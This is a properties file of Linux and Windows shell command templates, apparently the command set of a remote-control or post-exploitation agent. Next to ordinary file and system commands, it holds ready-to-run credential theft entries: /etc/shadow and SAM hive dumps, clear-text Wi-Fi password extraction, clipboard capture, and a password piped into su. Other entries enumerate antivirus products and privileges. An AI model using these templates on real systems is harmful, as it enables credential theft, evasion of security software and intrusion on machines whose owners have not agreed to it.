linux.ls=ls -la "{PATH}"
linux.pwd=pwd
linux.cd=cd "{PATH}"
linux.cat=cat "{FILE}"
linux.head=head -n {LINES} "{FILE}"
linux.tail=tail -n {LINES} "{FILE}"
linux.rm=rm -rf "{PATH}"
linux.mkdir=mkdir -p "{PATH}"
linux.cp=cp -r "{SRC}" "{DST}"
linux.mv=mv "{SRC}" "{DST}"
linux.chmod=chmod {ARGS}
linux.find=find "{PATH}" -name "{NAME}" 2>/dev/null
linux.grep=grep -n "{PATTERN}" "{FILE}"
linux.hash.sha256=sha256sum "{FILE}"
linux.hash.md5=md5sum "{FILE}"
linux.whoami=whoami
linux.id=id
linux.hostname=hostname
linux.uname=uname -a
linux.ps=ps aux --sort=-%cpu
linux.env=env
linux.netstat=ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null
linux.ifconfig=ip addr show 2>/dev/null || ifconfig 2>/dev/null
linux.arp=arp -n 2>/dev/null || ip neigh 2>/dev/null
linux.route=ip route 2>/dev/null || route -n 2>/dev/null
linux.users=awk -F: '$3>=1000||$3==0{print $1,$3,$6,$7}' /etc/passwd
linux.groups=groups
linux.services=systemctl list-units --type=service --state=running --no-pager 2>/dev/null || service --status-all 2>/dev/null
linux.privcheck=id; sudo -l 2>/dev/null
linux.antivirus=ps aux | grep -iE 'clamav|sophos|eset|avast|bitdefender|crowdstrike|falcon|sentinel|cylance'
linux.crontab=crontab -l 2>/dev/null; ls /etc/cron* 2>/dev/null
linux.clipboard=xclip -selection clipboard -o 2>/dev/null || xsel --clipboard --output 2>/dev/null || wl-paste 2>/dev/null || echo '[no clipboard tool]'
linux.wifidump=nmcli -s -g 802-11-wireless.ssid,802-11-wireless-security.psk connection show 2>/dev/null || grep -r 'psk=' /etc/NetworkManager/system-connections/ 2>/dev/null || echo '[nmcli not found]'
linux.lastlog=last -n 20 2>/dev/null || lastlog 2>/dev/null
linux.hashdump=cat /etc/shadow 2>/dev/null || echo 'permission denied'
linux.searchfiles=find / -name "{ARGS}" 2>/dev/null
linux.runas=echo '{PASS}' | su - {USER} -c '{CMD}' 2>&1

windows.ls=dir "{PATH}"
windows.pwd=cd
windows.cd=cd /d "{PATH}"
windows.cat=type "{FILE}"
windows.head=powershell -NoProfile -Command "Get-Content -Head {LINES} \"{FILE}\""
windows.tail=powershell -NoProfile -Command "Get-Content -Tail {LINES} \"{FILE}\""
windows.rm=cmd /c (del /f /q "{PATH}" 2>&1 || rmdir /s /q "{PATH}" 2>&1)
windows.mkdir=mkdir "{PATH}"
windows.cp=copy "{SRC}" "{DST}"
windows.mv=move "{SRC}" "{DST}"
windows.chmod=icacls {ARGS}
windows.find=where /r "{PATH}" "{NAME}" 2>&1
windows.grep=findstr /i "{PATTERN}" "{FILE}"
windows.hash.sha256=certutil -hashfile "{FILE}" SHA256
windows.hash.md5=certutil -hashfile "{FILE}" MD5
windows.whoami=whoami /all
windows.id=whoami /groups
windows.hostname=hostname
windows.uname=ver
windows.ps=tasklist /v
windows.env=set
windows.netstat=netstat -an
windows.ifconfig=ipconfig /all
windows.arp=arp -a
windows.route=route print
windows.users=net user
windows.groups=net localgroup
windows.services=sc query state= all
windows.privcheck=whoami /priv && net localgroup administrators
windows.antivirus=wmic /namespace:\\root\securitycenter2 path antivirusproduct get displayName 2>&1
windows.crontab=schtasks /query /fo LIST /v
windows.clipboard=powershell -NoProfile -Command "[System.Windows.Forms.Clipboard]::GetText()"
windows.wifidump=powershell -NoProfile -Command "(netsh wlan show profiles) | Select-String 'All User Profile' | ForEach-Object { $p=($_ -split ':')[1].Trim(); netsh wlan show profile name=$p key=clear }"
windows.lastlog=wevtutil qe Security /q:"*[System[EventID=4624]]" /c:10 /f:text 2>&1
windows.hashdump=reg save HKLM\SAM sam.bak 2>&1
windows.searchfiles=where /r C:\ {ARGS} 2>&1
windows.runas=runas /user:{USER} "{CMD}"

common.osquery=osqueryi --line "{ARGS}"
